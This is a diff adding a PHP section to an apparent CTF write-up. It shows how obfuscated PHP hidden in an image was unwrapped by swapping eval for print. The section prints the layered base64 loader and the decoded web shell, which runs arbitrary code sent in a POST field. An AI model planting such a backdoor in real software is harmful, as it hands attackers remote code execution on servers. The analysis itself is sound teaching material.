@@ -37,6 +37,42 @@ in a ROP fashion.
 I once again implemented a dumb emulator to unfold the ROP.
 You can find it in [arm_3.py](arm_3.py).
 
+## PHP
+
+### Challenge 1
+
+`index.php` includes an image as if it was a php file.
+We open the image and keep the final part, which is valid PHP code.
+Now we can replace `eval(...)` with `echo "$do_me\n";` and put the file inside
+a php tag `<?php ...code... ?>`.
+
+Now we can do `php image.php` and get
+```php
+$_= 'aWYoaXNzZXQoJF9QT1NUWyJldmlsIl0pKXtldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJldmlsIl0pKTsvKmV2aWxAZHN1LmVkdSovfQ==';$__='JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';$___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";eval($___($__));
+```
+
+Replace `eval` with `print`, put in a php file and run it again:
+```php
+$code=base64_decode($_);eval($code);
+```
+
+Let's see what's inside the base64-encoded `$_` variable:
+```bash
+$ echo aWYoaXNzZXQoJF9QT1NUWyJldmlsIl0pKXtldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJldmlsIl0pKTsvKmV2aWxAZHN1LmVkdSovfQ== | base64 -d
+if(isset($_POST["evil"])){eval(base64_decode($_POST["evil"]));/*evil@dsu.edu*/}
+```
+
+And there it is :)
+
+### Challenge 2
+
+This is similar to the previous, but more complicated.
+Special care must be taken to avoid eval'ing code which we don't control, but I
+managed to solve with the same "eval => print" style.
+
+By the way, printing stuff as you go is also a technique which works for simple
+javascript challenges.
+
 ## Shellcode
 
 The flag is hidden in the final part of the outer function.
